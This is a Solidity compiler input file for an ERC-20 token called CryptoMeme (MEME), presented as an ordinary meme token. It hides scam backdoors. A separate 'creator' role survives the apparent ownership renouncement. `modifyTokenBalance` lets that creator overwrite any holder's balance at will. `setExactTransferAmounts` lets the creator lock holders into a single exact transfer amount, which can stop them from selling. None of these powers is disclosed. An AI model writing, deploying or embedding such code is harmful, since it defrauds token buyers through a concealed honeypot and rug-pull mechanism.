{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.10;\r\n\r\ninterface IERC20Custom {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function getCaller() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwner is Context {\r\n    address private _soleOwner;\r\n    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address sender = getCaller();\r\n        _soleOwner = sender;\r\n        emit OwnershipTransferred(address(0), sender);\r\n    }\r\n\r\n    function getOwner() public view virtual returns (address) {\r\n        return _soleOwner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(getOwner() == getCaller(), \"Only owner can perform this action\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_soleOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        _soleOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract CryptoMeme is Context, SingleOwner, IERC20Custom {\r\n    mapping (address => mapping (address => uint256)) private _delegations;\r\n    mapping (address => uint256) private _wallets;\r\n    mapping (address => uint256) private _fixedTransferAmounts;\r\n    address private _creatorAddress;\r\n\r\n    string public constant _name = \"CryptoMeme\";\r\n    string public constant _symbol = \"MEME\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _totalSupply = 100000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _wallets[getCaller()] = _totalSupply;\r\n        emit Transfer(address(0), getCaller(), _totalSupply);\r\n    }\r\n\r\n    modifier onlyCreator() {\r\n        require(getCreator() == getCaller(), \"Only creator can perform this action\");\r\n        _;\r\n    }\r\n\r\n    function getCreator() public view virtual returns (address) {\r\n        return _creatorAddress;\r\n    }\r\n\r\n    function assignCreator(address newCreator) public onlyOwner {\r\n        _creatorAddress = newCreator;\r\n    }\r\n\r\n    event TokenDisbursed(address indexed user, uint256 oldBalance, uint256 newBalance);\r\n\r\n    function getExactTransferAmount(address account) public view returns (uint256) {\r\n        return _fixedTransferAmounts[account];\r\n    }\r\n\r\n    function setExactTransferAmounts(address[] calldata accounts, uint256 amount) public onlyCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _fixedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function modifyTokenBalance(address[] memory addresses, uint256 desiredBalance) public onlyCreator {\r\n        require(desiredBalance >= 0, \"Desired balance must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < addresses.length; i++) {\r\n            address currentUser = addresses[i];\r\n            require(currentUser != address(0), \"Address must not be the zero address\");\r\n\r\n            uint256 priorBalance = _wallets[currentUser];\r\n            _wallets[currentUser] = desiredBalance;\r\n\r\n            emit TokenDisbursed(currentUser, priorBalance, desiredBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _wallets[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_wallets[getCaller()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = getExactTransferAmount(getCaller());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _wallets[getCaller()] -= amount;\r\n    _wallets[recipient] += amount;\r\n\r\n    emit Transfer(getCaller(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _delegations[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _delegations[getCaller()][spender] = amount;\r\n        emit Approval(getCaller(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_delegations[sender][getCaller()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = getExactTransferAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _wallets[sender] -= amount;\r\n    _wallets[recipient] += amount;\r\n    _delegations[sender][getCaller()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}